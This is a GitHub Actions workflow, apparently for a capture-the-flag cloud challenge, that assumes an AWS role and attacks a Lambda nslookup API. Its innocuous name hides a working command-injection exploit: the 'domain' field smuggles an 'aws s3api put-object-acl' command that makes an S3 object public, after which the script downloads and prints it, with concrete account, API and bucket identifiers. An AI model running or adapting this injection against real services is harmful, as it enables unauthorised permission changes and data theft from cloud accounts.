name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          BUCKET="codec4f26c862a321ef5"
          
          echo "=== 1. FORCING LAMBDA TO GRANT READ PERMISSIONS ==="
          # This command injection tells the Lambda to use its AWS CLI to make flag.txt publicly readable via ACL
          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3api put-object-acl --bucket ${BUCKET} --key flag.txt --acl public-read\"}"
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 2 SECONDS FOR PERMISSIONS TO PROPAGATE ==="
          sleep 2
          
          echo "=== 3. DOWNLOADING FLAG DIRECTLY VIA HTTPS ==="
          # Since it's now public-read, your runner can download it straight over clean HTTPS with zero IAM blocks!
          curl -s "https://${BUCKET}.s3.${REGION}.amazonaws.com/flag.txt" -o direct_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
          cat direct_flag.txt
